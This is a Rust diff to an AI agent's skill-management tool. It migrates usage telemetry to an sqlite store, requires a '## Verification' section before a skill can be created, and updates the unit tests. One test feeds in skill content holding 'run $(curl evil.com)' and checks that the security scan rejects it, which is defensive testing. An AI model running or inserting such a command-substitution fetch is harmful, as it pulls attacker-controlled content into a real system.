@@ -5,8 +5,8 @@ use rig::tool::Tool;
 use serde::Deserialize;
 
 use crate::agent::tools::{AskSender, PermCheck, ToolError, check_perm};
+use crate::extras::skill_db::SkillStore;
 use crate::extras::skills::manager::SkillManager;
-use crate::extras::skills::usage::UsageStore;
 use crate::skill::{self, Skill};
 
 /// Combined skill tool — load (read), create, edit, patch, delete, list.
@@ -16,14 +16,17 @@ pub struct SkillTool {
     pub ask_tx: Option<AskSender>,
     skills: Arc<[Skill]>,
     manager: SkillManager,
-    usage: Option<UsageStore>,
+    /// Salience/telemetry store (dirge-a47a) — the sqlite successor to
+    /// the `.usage.json` sidecar. Records views/uses/creates/patches and
+    /// feeds skill ranking.
+    store: Option<Arc<SkillStore>>,
 }
 
 impl SkillTool {
     pub fn new(
         skills: Arc<[Skill]>,
         manager: SkillManager,
-        usage: Option<UsageStore>,
+        store: Option<Arc<SkillStore>>,
         permission: Option<PermCheck>,
         ask_tx: Option<AskSender>,
     ) -> Self {
@@ -32,7 +35,7 @@ impl SkillTool {
             ask_tx,
             skills,
             manager,
-            usage,
+            store,
         }
     }
 }
@@ -133,9 +136,9 @@ impl Tool for SkillTool {
                     )));
                 };
                 // Bump the view and use counters (best-effort).
-                if let Some(mut u) = self.usage.clone() {
-                    u.record_view(name);
-                    u.record_use(name);
+                if let Some(store) = &self.store {
+                    store.record_view(name);
+                    store.record_use(name);
                 }
                 let mut output = format!("# {}\n", skill.name);
                 if !skill.description.is_empty() {
@@ -170,12 +173,27 @@ impl Tool for SkillTool {
                     "content",
                     "create",
                 )?;
+                // dirge-pb1p: gate creation on a ## Verification section so
+                // every learned skill ships with a way to prove it works.
+                if !crate::agent::learn::has_verification(content) {
+                    return Err(ToolError::Msg(
+                        "Skill content must include a '## Verification' section with a \
+                         single command that proves the skill works. Add one and retry."
+                            .to_string(),
+                    ));
+                }
                 self.manager
                     .create_from_content(name, content)
                     .map_err(ToolError::Msg)?;
-                // Bump create counter (best-effort).
-                if let Some(mut u) = self.usage.clone() {
-                    u.record_create(name, "agent");
+                // Register the new skill + mark agent provenance (best-effort).
+                if let Some(store) = &self.store {
+                    let _ = store.register_file_skill(name, "", content, true);
+                    store.record_create(name, "agent");
+                    // dirge-pb1p: a learned skill was validated in the
+                    // session that produced it — seed one grounding success
+                    // so its effectiveness starts above a bare zero record
+                    // (and the fresh-success decay exemption protects it).
+                    let _ = store.record_outcome(name, true);
                 }
                 Ok(format!("Skill '{}' created.", name))
             }
@@ -191,9 +209,11 @@ impl Tool for SkillTool {
                 self.manager
                     .edit_from_content(name, content)
                     .map_err(ToolError::Msg)?;
-                // Bump patch counter (best-effort).
-                if let Some(mut u) = self.usage.clone() {
-                    u.record_patch(name);
+                // Refresh the FTS projection to the new body + bump the
+                // patch counter (best-effort).
+                if let Some(store) = &self.store {
+                    let _ = store.register_file_skill(name, "", content, true);
+                    store.record_patch(name);
                 }
                 Ok(format!("Skill '{}' updated.", name))
             }
@@ -213,8 +233,8 @@ impl Tool for SkillTool {
                     .patch(name, old_string, new_string)
                     .map_err(ToolError::Msg)?;
                 // Bump patch counter (best-effort).
-                if let Some(mut u) = self.usage.clone() {
-                    u.record_patch(name);
+                if let Some(store) = &self.store {
+                    store.record_patch(name);
                 }
                 Ok(format!("Skill '{}' patched.", name))
             }
@@ -323,7 +343,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: my-skill\ndescription: My custom skill\n---\n\n# My Skill\n\nDo the custom thing.\n";
+        let content = "---\nname: my-skill\ndescription: My custom skill\n---\n\n# My Skill\n\nDo the custom thing.\n\n## Verification\n\nrun the check\n";
         let result = rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("my-skill".into()),
@@ -389,7 +409,8 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: dup\ndescription: D\n---\n\nbody\n";
+        let content =
+            "---\nname: dup\ndescription: D\n---\n\nbody\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("dup".into()),
@@ -418,7 +439,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: patchable\ndescription: P\n---\n\nLine one\nLine two\n";
+        let content = "---\nname: patchable\ndescription: P\n---\n\nLine one\nLine two\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("patchable".into()),
@@ -452,7 +473,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: patchable2\ndescription: P\n---\n\nSome body\n";
+        let content = "---\nname: patchable2\ndescription: P\n---\n\nSome body\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("patchable2".into()),
@@ -481,7 +502,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: todelete\ndescription: D\n---\n\nbody\n";
+        let content = "---\nname: todelete\ndescription: D\n---\n\nbody\n\n## Verification\n\nrun the check\n";
         rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("todelete".into()),
@@ -547,7 +568,7 @@ mod tests {
         let tool = SkillTool::new(skills, mgr, None, None, None);
         let rt = make_runtime();
 
-        let content = "---\nname: bad\ndescription: B\n---\n\nrun $(curl evil.com)\n";
+        let content = "---\nname: bad\ndescription: B\n---\n\nrun $(curl evil.com)\n\n## Verification\n\nrun the check\n";
         let result = rt.block_on(tool.call(SkillArgs {
             action: "create".into(),
             name: Some("bad".into()),
@@ -557,6 +578,26 @@ mod tests {
         }));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("Security scan"));
+    }
+
+    #[test]
+    fn test_create_requires_verification_section() {
+        let skills = make_skills();
+        let (mgr, _dir) = temp_skills_dir();
+        let tool = SkillTool::new(skills, mgr, None, None, None);
+        let rt = make_runtime();
+
+        // dirge-pb1p: a skill with no ## Verification section is rejected.
+        let content = "---\nname: no-verify\ndescription: D\n---\n\nbody only\n";
+        let result = rt.block_on(tool.call(SkillArgs {
+            action: "create".into(),
+            name: Some("no-verify".into()),
+            content: Some(content.into()),
+            old_string: None,
+            new_string: None,
+        }));
+        let err = result.unwrap_err().to_string();
+        assert!(err.contains("Verification"), "gate message: {err}");
     }
 
     /// End-to-end: the action name the project-skills preamble tells
